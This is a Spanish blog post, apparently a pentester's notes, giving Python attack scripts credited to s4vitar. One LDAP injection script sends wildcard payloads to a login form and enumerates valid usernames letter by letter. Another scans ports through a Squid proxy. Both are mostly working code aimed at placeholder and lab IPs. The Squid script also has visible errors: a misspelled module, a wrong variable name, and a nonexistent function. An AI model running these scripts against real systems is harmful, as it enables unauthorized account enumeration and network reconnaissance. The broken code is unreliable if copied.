---
title: Python Scripts 1
date: 2023-09-20
categories: [Python, Scripts]
tags: [Python]
image:
  path: ../../assets/img/Python/Scripts/pythonScripts.png
  width: 528
  height: 340
  alt: Banner PythonScripts1
---

Dejaré por aquí estructuras de scripts interesantes para algunos ataques. Agradecimientos a Marcelo Vázquez, también conocido como s4vitar, porque muchos de estos scripts son sacados de sus videos de youtube y de su academia.


## Inyecciones LDAP

Para entender mejor este script recomiendo leer el apartado de Inyecciones LDAP en el post Vulnerabilidades 2.

Lo pondré en dos scripts; primera parte y script completo. Es para que se entienda mejor. 
```python
#!/usr/bin/pyhon3

# Primera parte. Te sacará la primera letra de los usuarios existentes.

import requests
import time
import sys
import signal
import string

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo del script...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://IP/"
characters = string.ascii_lowercase + string.digits
burp = {'http': 'http://127.0.0.1:8080'}
# La variable burp viene muy bien por si quisieras ver como viaja la petición.
# Para usarla añadir en la variable r; proxies=burp

def getInitialUsers():

    users = []
    headers_page = { 'Content-Type': 'application/x-www-form-urlencoded'} 
    # Ponemos la cabecera porque de no hacerlo no funcionaba, hay que ir 
    # probando mientras se realiza el script. Ten burpsuite cerca.

    for character in characters:
        
        post_data = "user={}*&password=test".format(character)

        r = requests.post(main_url, data=post_data, headers=headers_page, allow_redirects=False)
        # El allow_redirects=False es para evitar que te redireccione. Lo # # hacemos en este caso, porque filtraremos por el código de estado, # que de ser 301 será correcto """
        if r.status_code == 301:
            users.append(character)

    return users


if __name__ == '__main__':
    
    users = getInitialUsers()
    # La función getInitialUsers() devolverá lo contenido en users(por el return).
    # Podríamos haber usado otra variable distinta que no fuera users pero como está ya definida como lista pues mejor.

    print(users)
    # El programa nos devolvería las palabras iniciales de los usuarios que existan.
```
Por aquí va el script ya completo:

```python
#!/usr/bin/pyhon3

# Script Completo para obtención de usuarios válidos. Se podría modificar para passwords

import requests
import time
import sys
import signal
import string

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo del script...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://IP/"
characters = string.ascii_lowercase + string.digits
burp = {'http': 'http://127.0.0.1:8080'}
# La variable burp viene muy bien por si quisieras ver como viaja la petición.
# Para usarla añadir en la variable r; proxies=burp
headers_page = { 'Content-Type': 'application/x-www-form-urlencoded'} 
# Ponemos la cabecera porque de no hacerlo no funcionaba, hay que ir 
# probando mientras se realiza el script. Ten burpsuite cerca.

def getInitialUsers():

    users = []

    for character in characters:
        
        post_data = "user={}*&password=test".format(character)

        r = requests.post(main_url, data=post_data, headers=headers_page, allow_redirects=False)
        # El allow_redirects=False es para evitar que te redireccione. Lo # # hacemos en este caso, porque filtraremos por el código de estado, # que de ser 301 será correcto """
        if r.status_code == 301:
            users.append(character)

    return users

# La función de abajo es la que añadimos respecto al script anterior.
def getUsers(users):
    
    valid_users = []

    for first_character in users: # users es una lista con la inicial de cada usuario recuerda.
        user = ""

        for position in range(0, 15): # Suponiendo que no habrá más de 15 palabras para cada user.
        
            for character in characters:

                post_data = "user={}{}{}*&password=test".format(first_character, user, character)
# Explico esta parte. Imagina que ha sacado de la función anterior una "a" 
# entonces de first_caracter tendremos la "a", luego  la variable user es  # una cadena vacia así quedaría en nada de momento.
# y characer será la palabra que toque del diccionario.
                r = requests.post(main_url, data=post_data, headers=headers_page, allow_redirects=False)

                if r.status_code == 301:
                    user += character
                    break
        valid_users.append(first_character + user)
    return valid_users

if __name__ == '__main__':
    
    users = getInitialUsers()
    # La función getInitialUsers() devolverá lo contenido en users(por el return).
    # Podríamos haber usado otra variable distinta que no fuera users pero como está ya definida como lista pues mejor.
    valid_users = getUsers(users)
    print(valid_users)
    # Devolvería todos los usuarios.
```

- - - 

## Squid Proxy

En el siguiente script escanearemos puertos a través de un squid proxy.
```python
#!/usr/bin/python3

import sys, signal, requests

def def_handler(sig, frame):
    print("\n Saliendo..\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.11.11"
squid_proxy = {'http': 'http://10.10.11.11:3128'}

def portDiscovery():

    puertos_tcp_comunes = {20, 21, 22, 23, 25, 53, 80, 110, 115, 119, 123, 143, 161, 194, 443, 445, 465, 514, 515, 587, 993, 995, 1080, 1433, 1434, 1521, 1723, 2082, 2083, 2181, 2222, 2375, 2376, 3306, 3389, 3690, 4000, 4040, 4444, 4500, 5432, 5632, 5900, 5984, 6379, 7001, 7002, 8080, 8888, 9000, 9092, 9200, 9300}
    # Los 50 puertos más comunes, realizado con chatgpt. Si hacemos todos tardaría mucho.
    
    for tcp_port in puertos_tcp_comunes:
        
        r = request.get(main_url + ':' + str(tcp_ports), proxies=squid_proxy)
        # Sería como un curl 10.10.11.11:22 --proxy 10.10.11.11:3128.
        # str ya tiene que ser tipo string para poder concatenar con el +
        # Si el puerto está abierto posiblemente recibirimos cabeceras de respuesta del servicio o un código distinto.
        # print(r.status_code) para ver ese código. Imagina que suele salir como inválido el 503:
        if r.status_code != 503:

            print("\n Puerto abierto: " + string(tcp_port) + " -OPEN- \n")

if __name__ == '__main__':

    portDiscovery()

```
- - - 

